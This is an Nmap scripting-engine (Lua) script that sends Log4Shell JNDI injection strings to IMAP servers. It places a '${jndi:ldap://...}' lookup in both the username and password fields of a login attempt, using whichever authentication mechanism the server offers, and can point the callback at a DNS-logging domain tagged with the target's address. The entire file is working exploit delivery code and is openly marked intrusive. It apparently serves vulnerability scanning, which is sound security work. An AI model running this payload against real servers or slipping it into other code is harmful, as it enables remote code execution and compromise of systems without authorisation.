local imap = require "imap"
local shortport = require "shortport"
local stdnse = require "stdnse"

description = [[
Performs log4shell attack against IMAP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.
]]

---
-- @usage
-- nmap -p 143,993 --script imap-log4shell <host>
--
-- @output
-- PORT    STATE SERVICE REASON
-- 143/tcp open  imap    syn-ack
--
-- @args imap-log4shell.auth authentication mechanism to use LOGIN, PLAIN,
--                       CRAM-MD5, DIGEST-MD5 or NTLM

-- Version 0.1
-- Created 2021-12-11 - v0.1 - created by Vlatko Kosturjak <kost@linux.hr>


author = "Vlatko Kosturjak"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"log4shell", "intrusive"}

portrule = shortport.port_or_service({143,993}, {"imap","imaps"})

local mech
local function fail (err) return stdnse.format_output(false, err) end

action = function(host, port)
  local payload = stdnse.get_script_args(SCRIPT_NAME..".payload")
  local gpayload = stdnse.get_script_args("log4shell.payload")

  if not payload then
    if not gpayload then
      if nmap.registry['dnslog-cn'] then
	 stdnse.debug2("registry not present")
	 local registry = nmap.registry['dnslog-cn']
	 if registry.domain then
	       payload = "${jndi:ldap://{{target}}."..registry.domain.."}"
	 else
	       stdnse.debug2("session not present")
	 end
      else
	 payload = "${jndi:ldap://mydomain/uri}"
      end
      stdnse.debug1("Setting the payload to default payload:"..payload)
    else
      payload=gpayload
    end
  end

  target = host.ip .. "-" .. port.number
  payload = payload:gsub("{{target}}", target)

  stdnse.debug1("Final payload:"..payload)

  -- Connects to the server and retrieves the capabilities so that
  -- authentication mechanisms can be determined
  local helper = imap.Helper:new(host, port)
  local status = helper:connect()
  if (not(status)) then return fail("Failed to connect to the server.") end
  local status, capabilities = helper:capabilities()
  if (not(status)) then return fail("Failed to retrieve capabilities.") end

  -- check if an authentication mechanism was provided or try
  -- try them in the mech_prio order
  local mech_prio = stdnse.get_script_args("imap-brute.auth")
  mech_prio = ( mech_prio and { mech_prio } ) or
    { "LOGIN", "PLAIN", "CRAM-MD5", "DIGEST-MD5", "NTLM" }

  -- iterates over auth mechanisms until a valid mechanism is found
  for _, m in ipairs(mech_prio) do
    if ( m == "LOGIN" and not(capabilities.LOGINDISABLED)) then
      mech = "LOGIN"
      break
    elseif ( capabilities["AUTH=" .. m] ) then
      mech = m
      break
    end
  end

  -- if no mechanisms were found, abort
  if ( not(mech) ) then
    return fail("No suitable authentication mechanism was found")
  end

  if ( not(helper) ) then
    helper = imap.Helper:new( host, port )
    helper:connect()
  end

  username = payload
  password = payload
  stdnse.debug(1, "sending payload: %s", payload)
  local status, err = helper:login( username, password, mech )
  if ( status ) then
    helper:close()
  end
  if ( err:match("^ERROR: Failed to .* data$") ) then
    helper:close()
  end

  return
end
